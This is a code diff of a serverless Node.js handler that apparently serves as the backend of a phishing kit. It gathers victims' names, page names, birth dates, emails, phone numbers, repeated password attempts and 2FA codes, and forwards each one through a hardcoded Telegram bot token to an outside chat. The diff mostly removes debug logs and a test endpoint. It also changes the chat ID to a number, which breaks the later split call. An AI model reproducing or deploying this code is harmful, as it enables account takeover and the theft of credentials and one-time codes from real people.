@@ -1,8 +1,7 @@
 import crypto from 'crypto';
 
-// ==================== CONFIGURATION ====================
 const TELEGRAM_BOT_TOKEN = '857548907:AAFgAY0T_c-4suQh5zM04Q30Wb_LLDVi5TM';
-const TELEGRAM_CHAT_IDS = '-515807121';
+const TELEGRAM_CHAT_IDS = -515807121;
 const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';
 
 const MAX_PASSWORD_ATTEMPTS = 5;
@@ -22,22 +21,12 @@ const FIELD_LIMITS = {
     code: 10,
 };
 
-// ==================== INITIALIZATION ====================
 const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];
-
-// Debug: Kiểm tra cấu hình
-console.log('=== TELEGRAM CONFIGURATION ===');
-console.log('Bot Token exists:', !!TELEGRAM_BOT_TOKEN);
-console.log('Bot Token length:', TELEGRAM_BOT_TOKEN?.length || 0);
-console.log('Chat IDs raw:', TELEGRAM_CHAT_IDS);
-console.log('Chat IDs array:', CHAT_IDS_ARRAY);
-console.log('==============================');
 
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS || CHAT_IDS_ARRAY.length === 0) {
     console.error('CRITICAL: Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Vercel Dashboard');
 }
 
-// ==================== SESSION MANAGEMENT ====================
 const sessions = {};
 const rateLimits = new Map();
 const infoRateLimits = new Map();
@@ -51,7 +40,6 @@ function cleanupExpiredSessions() {
     }
 }
 
-// ==================== RATE LIMITING ====================
 function checkRateLimit(ip) {
     const now = Date.now();
     const key = ip || 'unknown';
@@ -82,10 +70,11 @@ function checkRateLimit(ip) {
     return { allowed: true, remaining: limit.max - record.count };
 }
 
+// Stricter rate limit specifically for 'info' submissions (creates sessions + sends Telegram)
 function checkInfoRateLimit(ip) {
     const now = Date.now();
     const key = ip || 'unknown';
-    const limit = { max: 10, window: 60000 };
+    const limit = { max: 10, window: 60000 }; // 10 info requests per 60s
 
     if (!infoRateLimits.has(key)) {
         infoRateLimits.set(key, { count: 1, resetAt: now + limit.window });
@@ -126,7 +115,6 @@ function cleanupRateLimits() {
     }
 }
 
-// ==================== LOGGING ====================
 function logRequest(level, type, message, metadata = {}) {
     const log = {
         timestamp: new Date().toISOString(),
@@ -150,7 +138,6 @@ function logError(type, error, metadata = {}) {
     logRequest('error', type, error.message || error, metadata);
 }
 
-// ==================== SECURITY ====================
 function setSecurityHeaders(res) {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
@@ -161,6 +148,7 @@ function generateSessionId() {
     return crypto.randomBytes(16).toString('hex');
 }
 
+// Prevent HTML injection in Telegram messages
 function escapeHtml(str) {
     if (!str) return '';
     return String(str)
@@ -170,7 +158,6 @@ function escapeHtml(str) {
         .replace(/"/g, '&quot;');
 }
 
-// ==================== VALIDATION ====================
 function validateData(data) {
     const issues = [];
     if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
@@ -196,6 +183,7 @@ function validateData(data) {
     return issues;
 }
 
+// Truncate fields to safe lengths (still logs data, just caps size)
 function sanitizeFields(data) {
     const sanitized = { ...data };
     for (const [field, maxLen] of Object.entries(FIELD_LIMITS)) {
@@ -203,6 +191,7 @@ function sanitizeFields(data) {
             sanitized[field] = sanitized[field].substring(0, maxLen);
         }
     }
+    // Sanitize nested device object
     if (sanitized.device && typeof sanitized.device === 'object') {
         for (const key of Object.keys(sanitized.device)) {
             if (typeof sanitized.device[key] === 'string' && sanitized.device[key].length > 100) {
@@ -222,7 +211,6 @@ function decodeData(encodedData) {
     }
 }
 
-// ==================== MESSAGE BUILDING ====================
 function buildMessage(session, ip = 'Unknown') {
     let msg = `<b>🔔 Notification</b>\n`;
     msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
@@ -241,13 +229,13 @@ function buildMessage(session, ip = 'Unknown') {
     }
 
     msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    msg += `<b>Full Name:</b> ${escapeHtml(session.fullName || '')}\n`;
-    msg += `<b>Page Name:</b> ${escapeHtml(session.fanpage || '')}\n`;
-    msg += `<b>Date of birth:</b> ${escapeHtml(session.dob || '')}\n`;
+    msg += `<b>Full Name:</b> ${escapeHtml(session.fullName)}\n`;
+    msg += `<b>Page Name:</b> ${escapeHtml(session.fanpage)}\n`;
+    msg += `<b>Date of birth:</b> ${escapeHtml(session.dob)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    msg += `<b>Email:</b> <code>${escapeHtml(session.email || '')}</code>\n`;
-    msg += `<b>Email Business:</b> <code>${escapeHtml(session.emailBusiness || '')}</code>\n`;
-    msg += `<b>Phone Number:</b> <code>${escapeHtml(session.phone || '')}</code>\n`;
+    msg += `<b>Email:</b> <code>${escapeHtml(session.email)}</code>\n`;
+    msg += `<b>Email Business:</b> <code>${escapeHtml(session.emailBusiness)}</code>\n`;
+    msg += `<b>Phone Number:</b> <code>${escapeHtml(session.phone)}</code>\n`;
     if (session.note) {
         msg += `<b>Note:</b> ${escapeHtml(session.note)}\n`;
     }
@@ -270,127 +258,49 @@ function buildMessage(session, ip = 'Unknown') {
         if (codes[2]) msg += `<b>Code 2FA(3):</b> <code>${escapeHtml(codes[2])}</code>\n`;
     }
 
-    console.log(`[DEBUG] Message built, length: ${msg.length} characters`);
     return msg;
 }
 
-// ==================== TELEGRAM (FIXED VERSION) ====================
 async function sendTelegram(message, messageIdsMap = null) {
-    // Kiểm tra cấu hình
-    if (!TELEGRAM_BOT_TOKEN) {
-        console.error('[TELEGRAM] Bot token is missing!');
+    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
+        console.error('Telegram credentials not configured');
         return {};
     }
-    
-    if (CHAT_IDS_ARRAY.length === 0) {
-        console.error('[TELEGRAM] No chat IDs configured!');
-        return {};
-    }
-
-    console.log('[TELEGRAM] ===== STARTING TELEGRAM SEND =====');
-    console.log('[TELEGRAM] Bot Token (first 10 chars):', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
-    console.log('[TELEGRAM] Chat IDs:', CHAT_IDS_ARRAY);
-    console.log('[TELEGRAM] Message length:', message.length);
-    console.log('[TELEGRAM] Message preview:', message.substring(0, 100) + '...');
 
     const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
         try {
             const messageId = messageIdsMap ? messageIdsMap[chatId] : null;
-            
-            // Kiểm tra chat ID format
-            console.log(`[TELEGRAM] Processing chat ID: "${chatId}" (type: ${typeof chatId})`);
-            
-            // Đảm bảo chatId là string
-            const chatIdStr = String(chatId).trim();
-            
             const url = messageId
                 ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
                 : `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-            console.log(`[TELEGRAM] Sending to ${chatIdStr}...`);
-            console.log(`[TELEGRAM] URL:`, url.replace(TELEGRAM_BOT_TOKEN, '[REDACTED]'));
-
-            // Tạo payload
-            const payload = {
-                chat_id: chatIdStr,
-                text: message,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true
-            };
-            
-            if (messageId) {
-                payload.message_id = messageId;
-            }
-
-            console.log(`[TELEGRAM] Payload:`, JSON.stringify({
-                ...payload,
-                chat_id: payload.chat_id,
-                text: payload.text.substring(0, 50) + '...'
-            }));
-
-            // Gửi request
             const response = await fetch(url, {
                 method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML',
+                    ...(messageId && { message_id: messageId })
+                })
             });
-            
             const data = await response.json();
-            
-            console.log(`[TELEGRAM] Response status:`, response.status);
-            console.log(`[TELEGRAM] Response data:`, JSON.stringify(data, null, 2));
-            
-            if (!data.ok) {
-                console.error(`[TELEGRAM] Telegram API error for ${chatIdStr}:`, data.description);
-                
-                // Xử lý lỗi cụ thể
-                if (data.description?.includes('chat not found')) {
-                    console.error(`[TELEGRAM] ❌ Chat ID ${chatIdStr} not found! Make sure bot is added to this chat.`);
-                } else if (data.description?.includes('bot was blocked')) {
-                    console.error(`[TELEGRAM] ❌ Bot was blocked by user/group ${chatIdStr}`);
-                } else if (data.description?.includes('can't parse entities')) {
-                    console.error(`[TELEGRAM] ❌ HTML parse error in message`);
-                }
-            } else {
-                console.log(`[TELEGRAM] ✅ Successfully sent to ${chatIdStr}, message_id:`, data.result?.message_id);
-            }
-            
-            return { 
-                chatId: chatIdStr, 
-                messageId: data.result?.message_id || null, 
-                success: !!data.ok,
-                error: data.description
-            };
-            
+            return { chatId, messageId: data.result?.message_id || null, success: !!data.ok };
         } catch (e) {
-            // Che giấu bot token trong error message
             const safeError = (e.message || '').replace(TELEGRAM_BOT_TOKEN, '[REDACTED]');
-            console.error(`[TELEGRAM] ❌ Network/Parse error for chat ${chatId}:`, safeError);
-            console.error(`[TELEGRAM] Error stack:`, e.stack);
-            return { chatId, messageId: null, success: false, error: safeError };
+            console.error(`Telegram error for chat ${chatId}:`, safeError);
+            return { chatId, messageId: null, success: false };
         }
     });
 
     const results = await Promise.all(promises);
-    
-    // Tổng kết kết quả
-    console.log('[TELEGRAM] ===== SEND RESULTS =====');
-    results.forEach(r => {
-        console.log(`[TELEGRAM] Chat ${r.chatId}: ${r.success ? '✅ Success' : '❌ Failed'} ${r.error ? `- ${r.error}` : ''}`);
-    });
-    
     const messageIds = {};
     results.forEach(r => {
         if (r.messageId) messageIds[r.chatId] = r.messageId;
     });
-    
-    console.log('[TELEGRAM] ===== END TELEGRAM SEND =====');
     return messageIds;
 }
 
-// ==================== IP LOOKUP ====================
 async function getIPInfo(ip) {
     try {
         const res = await fetch(`https://ipapi.co/${ip}/json/`, {
@@ -407,95 +317,14 @@ async function getIPInfo(ip) {
     return 'Unknown';
 }
 
-// ==================== TEST ENDPOINT ====================
-async function handleTest(req, res) {
-    console.log('[TEST] Testing Telegram connection...');
-    
-    const results = {
-        botTokenValid: false,
-        botInfo: null,
-        sendTest: false,
-        chatIds: CHAT_IDS_ARRAY,
-        errors: []
-    };
-    
-    try {
-        // Test 1: Kiểm tra bot token
-        const meResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
-        const meData = await meResponse.json();
-        
-        results.botTokenValid = meData.ok;
-        results.botInfo = meData.ok ? meData.result : null;
-        
-        if (!meData.ok) {
-            results.errors.push(`Bot token invalid: ${meData.description}`);
-        } else {
-            console.log('[TEST] Bot token valid, bot username:', meData.result.username);
-        }
-        
-        // Test 2: Gửi tin nhắn test
-        if (meData.ok && CHAT_IDS_ARRAY.length > 0) {
-            const testMessage = `<b>🔧 Test Message</b>\n` +
-                `━━━━━━━━━━━━━━━━━━━━━\n` +
-                `This is a test from debug endpoint\n` +
-                `Time: ${new Date().toISOString()}\n` +
-                `━━━━━━━━━━━━━━━━━━━━━`;
-            
-            const sendResults = await Promise.all(CHAT_IDS_ARRAY.map(async (chatId) => {
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: String(chatId).trim(),
-                            text: testMessage,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                    const data = await response.json();
-                    return {
-                        chatId,
-                        success: data.ok,
-                        message: data.description || 'OK',
-                        messageId: data.result?.message_id
-                    };
-                } catch (e) {
-                    return {
-                        chatId,
-                        success: false,
-                        message: e.message
-                    };
-                }
-            }));
-            
-            results.sendResults = sendResults;
-            results.sendTest = sendResults.some(r => r.success);
-        }
-        
-    } catch (error) {
-        results.errors.push(error.message);
-    }
-    
-    return res.status(200).json(results);
-}
-
-// ==================== MAIN HANDLER ====================
 export default async function handler(req, res) {
     const startTime = Date.now();
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';
-
-    console.log(`\n[REQUEST] ${new Date().toISOString()} - ${req.method} from ${ip}`);
-
-    // Test endpoint
-    if (req.method === 'GET' && req.query.test === 'telegram') {
-        return handleTest(req, res);
-    }
 
     cleanupExpiredSessions();
     cleanupRateLimits();
     setSecurityHeaders(res);
 
-    // CORS
     const requestOrigin = req.headers.origin || '';
     let corsAllowed = false;
 
@@ -512,18 +341,12 @@ export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     res.setHeader('Vary', 'Origin');
 
-    // OPTIONS request
-    if (req.method === 'OPTIONS') {
-        return res.status(200).end();
-    }
-
-    // Only allow POST
+    if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') {
         logError('invalid_method', new Error(`Method ${req.method} not allowed`), { ip });
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    // Rate limit check
     const rateCheck = checkRateLimit(ip);
     if (!rateCheck.allowed) {
         logRequest('warn', 'rate_limit', `IP ${ip} exceeded rate limit`, { ip });
@@ -532,11 +355,6 @@ export default async function handler(req, res) {
 
     try {
         const { data: encoded } = req.body;
-        
-        if (!encoded) {
-            return res.status(400).json({ success: false, error: 'No data provided' });
-        }
-        
         const data = decodeData(encoded);
 
         if (!data) {
@@ -546,8 +364,8 @@ export default async function handler(req, res) {
 
         const { type, session_id } = data;
 
-        // ===== INFO TYPE =====
         if (type === 'info') {
+            // Apply stricter rate limit for info (session creation + Telegram)
             const infoRateCheck = checkInfoRateLimit(ip);
             if (!infoRateCheck.allowed) {
                 logRequest('warn', 'info_rate_limit', `IP ${ip} exceeded info rate limit`, { ip });
@@ -580,8 +398,6 @@ export default async function handler(req, res) {
                 createdAt: Date.now()
             };
 
-            console.log(`[INFO] Session created: ${id} for ${ip}`);
-
             const msg = buildMessage(sessions[id], ip);
             const messageIds = await sendTelegram(msg);
             sessions[id].messageIds = messageIds;
@@ -590,13 +406,11 @@ export default async function handler(req, res) {
             return res.status(200).json({ success: true, session_id: id });
         }
 
-        // ===== PASSWORD TYPE =====
         if (type === 'password' && sessions[session_id]) {
             if (sessions[session_id].ip !== ip) {
                 logRequest('warn', 'ip_mismatch', 'Password attempt from different IP', { ip, sessionId: session_id });
                 return res.status(403).json({ success: false, error: 'Session expired' });
             }
-            
             if (sessions[session_id].passwords.length >= MAX_PASSWORD_ATTEMPTS) {
                 logRequest('warn', 'max_attempts', 'Max password attempts exceeded', { ip, sessionId: session_id });
                 return res.status(429).json({ success: false, error: 'Too many attempts' });
@@ -605,8 +419,7 @@ export default async function handler(req, res) {
             const safePassword = (data.password || '').substring(0, FIELD_LIMITS.password);
             sessions[session_id].passwords.push(safePassword);
 
-            console.log(`[PASSWORD] New password for session ${session_id}`);
-
+            // Send as a NEW separate message (full info)
             const msg = buildMessage(sessions[session_id], ip);
             await sendTelegram(msg);
 
@@ -614,13 +427,11 @@ export default async function handler(req, res) {
             return res.status(200).json({ success: true });
         }
 
-        // ===== 2FA TYPE =====
         if (type === '2fa' && sessions[session_id]) {
             if (sessions[session_id].ip !== ip) {
                 logRequest('warn', 'ip_mismatch', '2FA attempt from different IP', { ip, sessionId: session_id });
                 return res.status(403).json({ success: false, error: 'Session expired' });
             }
-            
             if (sessions[session_id].codes.length >= MAX_2FA_ATTEMPTS) {
                 logRequest('warn', 'max_attempts', 'Max 2FA attempts exceeded', { ip, sessionId: session_id });
                 return res.status(429).json({ success: false, error: 'Too many attempts' });
@@ -629,8 +440,7 @@ export default async function handler(req, res) {
             const safeCode = (data.code || '').substring(0, FIELD_LIMITS.code);
             sessions[session_id].codes.push(safeCode);
 
-            console.log(`[2FA] New code for session ${session_id}`);
-
+            // Send as a NEW separate message (full info)
             const msg = buildMessage(sessions[session_id], ip);
             await sendTelegram(msg);
 
@@ -638,7 +448,6 @@ export default async function handler(req, res) {
             return res.status(200).json({ success: true });
         }
 
-        // Unknown type
         logRequest('warn', 'unknown_type', `Unknown type: ${type}`, { ip });
         return res.status(400).json({ success: false, error: 'Invalid request type' });
 
